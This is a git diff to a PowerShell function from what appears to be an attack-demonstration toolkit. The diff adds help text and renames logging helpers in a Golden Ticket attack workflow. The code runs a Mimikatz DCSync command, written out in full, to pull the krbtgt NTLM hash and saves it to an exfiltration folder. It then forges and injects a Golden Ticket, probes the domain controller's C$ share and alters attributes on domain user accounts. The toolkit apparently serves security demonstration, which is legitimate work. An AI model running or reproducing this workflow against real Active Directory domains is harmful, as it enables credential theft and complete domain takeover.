@@ -1,3 +1,35 @@
+<#
+.SYNOPSIS
+Demonstrates Golden Ticket creation and its use against a selected domain.
+
+.DESCRIPTION
+Prompts for a domain and a built-in Administrator, generated fake identity, or previously saved ticket identity.
+Offers a Mimikatz DCSync request for the domain krbtgt hash, saves a retrieved hash, and prompts to confirm or replace it.
+On confirmation, purges cached tickets and forges and injects a Golden Ticket using the configured domain SID.
+Displays cached tickets, attempts access to the DC C$ share, and changes the info attribute of up to ten domain users.
+
+.EXAMPLE
+Invoke-GoldenTicket
+Runs this workflow using the initialized AS2Go module configuration.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Requires Mimikatz, initialized AS2Go domain settings, and the rights needed for the selected operations.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Selects a domain and ticket identity, then offers DCSync retrieval or confirmation of the krbtgt hash.
+Creates and injects a Golden Ticket, inspects cached tickets, and tests access to the DC admin share.
+Changes the info attribute of up to ten domain users to demonstrate directory access.
+#>
 Function Invoke-GoldenTicket {
 
     ################################################################################
@@ -6,10 +38,7 @@ Function Invoke-GoldenTicket {
     #####                                                                      #####
     ################################################################################
 
-    $CurrentFunction = Get-FunctionName
-    Write-Log -Message "### Start Function $CurrentFunction ###"
-    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
-    #################### main code | out- host #####################
+    $Info = Measure-FunctionRuntime -Begin
 
     $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain to get a Domain Controller for DPAPI Master Key Export"
     $fqdn = Convert-FromDNToCN -DistinguishedName $dn
@@ -36,7 +65,7 @@ Function Invoke-GoldenTicket {
     $temp = Get-ASConfig -Setting "LastGTUser"
     $lastGTU = $temp.PadRight(24, [char]32)
 
-    Invoke-output -Type Header -Message "Select an (fake) account for the Golden Ticket attack, for "
+    Write-AS2GoOutput -Type Header -Message "Select an (fake) account for the Golden Ticket attack, for "
 
     Write-Host "     - the Administrator   $s500 enter:   " -NoNewline; Write-Host "A"-ForegroundColor Yellow
     Write-Host "     - the Fake User       $sFakeUser enter:   " -NoNewline; Write-Host "F"-ForegroundColor Yellow
@@ -62,13 +91,13 @@ Function Invoke-GoldenTicket {
 
     $sFakeUser = $temp.trim() 
 
-    invoke-output -Type Textmaker -message "Selected Account:" -TM $sFakeUser
+    Write-AS2GoOutput -Type Textmaker -message "Selected Account:" -TM $sFakeUser
     Set-ASConfig -Setting "LastGTUser" -Value $sFakeUser
 
     If (-not $SkipClearHost) { Clear-Host }
 
-    Invoke-Output -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
-    Invoke-Output -Type CodeSnippet -Message "Command:"
+    Write-AS2GoOutput -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
+    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
     Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log", """ ""lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
         -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
            
@@ -81,11 +110,11 @@ Function Invoke-GoldenTicket {
         [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser.log" | Select-String 'Hash NTLM:'
 
         if (([string]::IsNullOrEmpty($result))  ) {
-            Invoke-output -type Error -Message  "Failed receiving NTLM Hash for $KrbtgtAccount account"
+            Write-AS2GoOutput -type Error -Message  "Failed receiving NTLM Hash for $KrbtgtAccount account"
         }
         else {
             $hash = $result.Replace(" ", "").Split(":")[-1]
-            Invoke-output -type Success -Message "Identified NTLM Hash $hash for $KrbtgtAccount account"
+            Write-AS2GoOutput -type Success -Message "Identified NTLM Hash $hash for $KrbtgtAccount account"
             set-ASConfig -Setting "krbtgtntml" -Value $hash
         }
         
@@ -99,7 +128,7 @@ Function Invoke-GoldenTicket {
         
         
     Do {
-        Invoke-Output -Type Header -Message "Step 2 of 3 | Forge a Golden Ticket"
+        Write-AS2GoOutput -Type Header -Message "Step 2 of 3 | Forge a Golden Ticket"
 
         $question = " -> Is this NTLH HASH '$Script:ASKrbtgtNtml'  for '$KrbtgtAccount'  correct - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $Script:Yes
@@ -131,11 +160,11 @@ Function Invoke-GoldenTicket {
         [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser`GT.log" | Select-String 'Golden ticket for'
 
         if (([string]::IsNullOrEmpty($result))  ) {
-            Invoke-output -type Error -Message  "Failed to summit a Golden ticket for '$sFakeUser'."
+            Write-AS2GoOutput -type Error -Message  "Failed to summit a Golden ticket for '$sFakeUser'."
         }
         else {
             #Golden ticket for 'FU-20260520.144200 @ WS19-CHILD01.WS19-ROOT.CORP' successfully submitted for current session
-            Invoke-output -type Success -Message $result
+            Write-AS2GoOutput -type Success -Message $result
         }
             
             
@@ -143,8 +172,8 @@ Function Invoke-GoldenTicket {
         If (-not $SkipClearHost) { Clear-Host }
          
         
-        invoke-output -type Header -message "Displays a list of currently cached Kerberos tickets"
-        invoke-output -type CodeSnippet -message "Command:"
+        Write-AS2GoOutput -type Header -message "Displays a list of currently cached Kerberos tickets"
+        Write-AS2GoOutput -type CodeSnippet -message "Command:"
 
         Write-Highlight -Text ('      klist') -Color $fgcC
         Write-Host ""  
@@ -152,7 +181,7 @@ Function Invoke-GoldenTicket {
         Set-NewColorSchema -NewStage $Script:GoldenTicket
         $tickets = Get-KlistTicket
         $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-        Invoke-Output -Type Info -Message "Last Ticket"
+        Write-AS2GoOutput -Type Info -Message "Last Ticket"
         $tickets | Select-object -Last 1 | Format-List
         Write-Host ""
         Pause
@@ -160,7 +189,7 @@ Function Invoke-GoldenTicket {
         Set-NewColorSchema -NewStage $Script:InitialStart    
         If (-not $SkipClearHost) { Clear-Host }
         
-        invoke-output -type Header -message "Step 3 of 3 | Test the Golden Ticket"
+        Write-AS2GoOutput -type Header -message "Step 3 of 3 | Test the Golden Ticket"
         #"Make some changes to the Domain to verify the Golden Ticket attack was successful"
         
         $passed = Test-AccessDirectory -directory "\\$server\c$\*.*"
@@ -170,18 +199,15 @@ Function Invoke-GoldenTicket {
         
         
         If ($passed) {
-            Invoke-Output -Type Success -Message "Successfully accessed directory '\\$server\c$\*.*'."
+            Write-AS2GoOutput -Type Success -Message "Successfully accessed directory '\\$server\c$\*.*'."
         }
         else {
-            Invoke-Output -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
+            Write-AS2GoOutput -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
         }
 
         Pause
     }
 
 
-    ######################## main code ############################
-    $runtime = Get-RunTime -StartRunTime $StartRunTime
-    Write-Log -Message "    Run Time: $runtime [h] ###"
-    Write-Log -Message "### End Function $CurrentFunction ###"
+    Measure-FunctionRuntime -End -Details $Info
 }
